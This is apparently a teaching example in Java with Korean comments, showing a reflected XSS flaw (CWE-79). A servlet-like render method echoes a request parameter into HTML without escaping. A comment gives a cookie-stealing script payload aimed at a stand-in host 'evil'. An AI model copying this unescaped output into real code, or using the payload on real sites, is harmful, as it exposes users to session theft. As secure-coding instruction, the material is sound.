import java.io.PrintWriter;

/**
 * [취약 예제] 크로스사이트 스크립트(XSS) (CWE-79 / KISA 4.4)
 *
 * 외부 입력을 아무 인코딩 없이 HTML 응답에 그대로 출력한다.
 * 공격자가 <script> 태그를 넣으면 다른 사용자의 브라우저에서
 * 임의 자바스크립트가 실행되어 세션 탈취, 화면 변조가 가능하다.
 *
 * 위험 지점:
 *   out.println(request.getParameter(...))  // HTML 이스케이프 없음
 */
public class Vulnerable {

    /** HttpServletRequest 를 흉내내는 최소 목(mock). */
    static class Request {
        String getParameter(String name) {
            // 예: keyword = "<script>document.location='http://evil'+document.cookie</script>"
            return "<script>alert(1)</script>";
        }
    }

    public void render(Request request, PrintWriter out) {
        String keyword = request.getParameter("keyword"); // 신뢰할 수 없는 입력

        // ★ 취약: 입력을 HTML 문맥에 그대로 삽입한다. 태그가 그대로 실행된다.
        String open = "<div class='result'>검색 결과 (검색어: ";
        out.println(open + request.getParameter("keyword") + " )");
        out.print(keyword + " 에 대한 결과입니다.");
    }

    public static void main(String[] args) {
        new Vulnerable().render(new Request(), new PrintWriter(System.out, true));
    }
}
